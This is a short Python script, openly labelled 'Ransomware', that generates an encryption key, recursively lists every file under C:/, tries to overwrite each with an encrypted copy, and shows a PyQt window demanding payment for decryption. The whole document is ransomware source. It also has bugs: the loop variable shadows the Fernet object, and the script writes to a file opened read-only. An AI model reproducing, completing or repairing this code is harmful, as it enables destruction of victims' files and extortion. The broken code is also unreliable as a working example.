import os
from cryptography.fernet import Fernet
import sys
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
key = Fernet.generate_key()

with open('mykey.key', 'wb') as mykey:
    mykey.write(key)
print(key)
f = Fernet(key)
files = [None]
def listdir():
    return getListOfFiles('c:/')
def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)

    return allFiles

for f in listdir():
    with open(f, 'rb') as original_file:
         original = original_file.read()

    encrypted = f.encrypt(original)

    original_file.write(encrypted)
def window():
    app = QApplication(sys.argv)
    widget = QWidget()

    label = QLabel(widget)
    label.setText("I encrypted all your files to decrypt them pay me X dollars, URL: https://google.com")#google for example

    widget.setWindowTitle("Ransomware")
    widget.show()
    widget.setGeometry(80, 80, 600, 400)

    sys.exit(app.exec())

if __name__ == '__main__':
    window()
